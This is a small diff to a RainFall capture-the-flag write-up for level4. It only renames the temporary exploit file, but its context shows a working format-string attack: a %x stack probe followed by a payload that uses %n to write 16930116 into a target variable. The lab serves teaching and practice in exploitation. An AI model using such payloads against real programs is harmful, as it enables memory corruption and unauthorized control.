@@ -69,8 +69,8 @@ And compare with variable ```m``` and 0x1025544, in decimal 16930116.
 ```
 As the previous level we try to lookup the stack values,
 ```sh
-level4@RainFall:~$ python -c 'print "BBBB" + " %x" * 20' > /tmp/exploit3
-level4@RainFall:~$ cat /tmp/exploit3 | ./level4 
+level4@RainFall:~$ python -c 'print "BBBB" + " %x" * 20' > /tmp/exploit4
+level4@RainFall:~$ cat /tmp/exploit4 | ./level4 
 BBBB b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825
 ```
 And we can see that our BBBB which is ```42424242``` at the 12th position, so now we just have to do the same thing as the previous level: set value to ```16930116```.
@@ -84,8 +84,8 @@ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"'
 ```printf()``` internally does counting for characters that has been printed but since we have to print ```16930112``` characters, it will be tough to allocate all of them in the memory. \
 But by adding little ```d``` option, which helps to count characters "virtually" to track the total numbers of printed characters, it no longer has to allocate memory for millions of characters.
 ```sh
-level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit3
-level4@RainFall:~$ cat /tmp/exploit3 - | ./level4 
+level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit4
+level4@RainFall:~$ cat /tmp/exploit4 - | ./level4 
 ...
 (hidden)
 ```
